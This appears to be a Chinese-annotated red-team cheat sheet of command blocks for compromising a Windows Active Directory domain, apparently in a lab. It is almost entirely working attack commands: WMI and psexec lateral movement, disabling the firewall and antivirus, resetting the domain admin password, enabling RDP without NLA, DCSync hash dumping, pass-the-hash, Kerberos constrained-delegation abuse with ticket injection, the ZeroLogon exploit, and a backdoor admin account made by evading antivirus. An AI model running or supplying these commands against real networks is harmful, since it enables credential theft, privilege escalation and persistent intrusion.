```cmd
# ============================
# 阶段一：WMI 横向移动与执行命令
# ============================

# 使用 wmiexec.py 进行半交互式命令执行 (Impacket 工具集)
# -codec gbk: 解决中文系统乱码问题
wmiexec.py -codec gbk JISHU/administrator:admin!@#45#45@192.168.2.20

# ============================
# 阶段二：防御绕过与环境准备 (在目标主机 2.20 上执行)
# ============================

# 关闭 Windows 防火墙所有配置文件 (域/专用/公用)
netsh advfirewall set allprofiles state off

// (手动操作) 关闭火绒或其他杀毒软件，防止后续操作被拦截

# ============================
# 阶段三：权限维持与后门建立
# ============================

# 强制修改域管理员 密码
# 目的: 重置域管密码，确保持有最高权限，或作为持久化后门
net user administrator a1b2c3.. /domain

# ============================
# 阶段四：开启 RDP 远程桌面
# ============================

# 修改注册表允许远程桌面连接
# fDenyTSConnections -> 0 表示 "允许连接"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 修改注册表关闭 "网络级别身份验证 (NLA)"
# UserAuthentication -> 0 表示 "允许运行任意版本远程桌面的计算机连接" (降低连接难度)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f


# ============================
# 阶段五：凭据导出 (DCSync 攻击)
# ============================

# 利用域控机器账号 Hash 导出域内所有用户 Hash (包括 krbtgt)
# 目标: 192.168.3.20 (推测为域控 IP)
secretsdump.py XIAOSHOUDC$@192.168.3.20 -no-pass
```

```cmd
# ============================
# 阶段一：清理与横向移动 (PTH)
# ============================

# 1. 恢复原始令牌，清理当前 impersonate 的身份，防止权限干扰
rev2self

# 2. 使用域管的 NTLM Hash 进行传递哈希攻击
# 格式：pth <域/用户> <NTLM Hash>
# 目的：在内存中伪造 Administrator 的登录令牌，无需明文密码
pth xiaoshou.xiaodi.vpc/Administrator f1065013e55bbbeb64ddab768229710d

# 3. 等待 mimikatz 注入令牌成功 (通常需 5-10 秒)，看到输出 "OK !" 后继续

# 4. 利用刚才注入的令牌进行横向移动
# 格式：jump <模块> <目标IP> <管道/协议>
# 目标：在 192.168.3.20 机器上通过 SMB 管道执行 Payload
jump psexec64 192.168.3.20 SMB


# ============================
# 阶段二：信息收集 (查找委派配置)
# ============================

# 使用 AdFind 查询域内配置了约束委派的用户或主机
# 格式：AdFind -b <搜索基点> -f <LDAP过滤器> <请求的属性>
# 目的：寻找类似 "fileadmin" 这种拥有 msDS-AllowedToDelegateTo 权限的账号
AdFind -b "DC=xiaodi,DC=vpc" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto


# ============================
# 阶段三：利用委派 (S4U2Self/S4U2Proxy)
# ============================

// 步骤 1: 申请 fileadmin 用户的 TGT 票据 (使用明文密码)
// 格式：tgt::ask /user:<用户> /domain:<域> /password:<密码> /ticket:<保存文件名>
shell c:\\kekeo "tgt::ask /user:fileadmin /domain:xiaodi.vpc /password::file!@#45 /ticket:administrator.kirbi" "exit"

// 步骤 1 (备用): 申请 fileadmin 用户的 TGT 票据 (使用 Hash)
// 格式：tgt::ask /user:<用户> /domain:<域> /NTLM:<Hash> /ticket:<保存文件名>
shell c:\\kekeo "tgt::ask /user:fileadmin /domain:xiaodi.vpc /NTLM:109614516980a96b5faa02f3edaddebb /ticket:administrator.kirbi" "exit"


// 步骤 2: 利用 S4U 协议申请访问域控 (DC) 的服务票据 (TGS)
// 原理: S4U2Self (模拟自己为域管) -> S4U2Proxy (用 fileadmin 的权限代表域管访问 DC)
// 格式：tgs::s4u /tgt:<fileadmin的TGT> /user:<要模拟的用户> /service:<目标服务SPN>
shell c:\\kekeo "tgs::s4u /tgt:TGT_fileadmin@XIAODI.VPC_krbtgt~xiaodi.vpc@XIAODI.VPC.kirbi /user:Administrator@xiaodi.vpc /service:cifs/dc" "exit"

// 步骤 2 (备用): 申请完整域名的服务票据 (兼容性更好)
shell c:\\kekeo "tgs::s4u /tgt:TGT_fileadmin@XIAODI.VPC_krbtgt~xiaodi.vpc@XIAODI.VPC.kirbi /user:Administrator@xiaodi.vpc /service:cifs/dc.xiaodi.vpc" "exit"


// 步骤 3: 将伪造的域管 TGS 票据导入当前内存
// 效果：当前会话立即获得访问 DC (CIFS$) 的权限
mimikatz kerberos::ptt TGS_Administrator@xiaodi.vpc@XIAODI.VPC_cifs~dc@XIAODI.VPC.kirbi

mimikatz kerberos::ptt TGS_Administrator@xiaodi.vpc@XIAODI.VPC_cifs~dc.xiaodi.vpc@XIAODI.VPC.kirbi
```

```cmd
// CVE-2020-1472 命令tips
python CVE-2020-1472_Exploit.py masterpc 192.168.111.100

// dump hash
secretsdump.py -no-pass myd.com/masterpc$@192.168.111.100 -dc-ip 192.168.111.100

// 带hash连接
python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:ec0df45863a3751d56ba6df1e72f7218 myd.com/Admin
istrator@192.168.213.100

// 不带密码连接
wmiexec.py -k -no-pass myd.com/Administrator@192.168.111.100 -dc-ip 192.168.111.100

// 绕过杀软创建后门用户
shell copy C:\windows\system32\net1.exe net.txt
shell net.txt user admin 123 /add
shell net.txt localgroup administrators admin /add
```





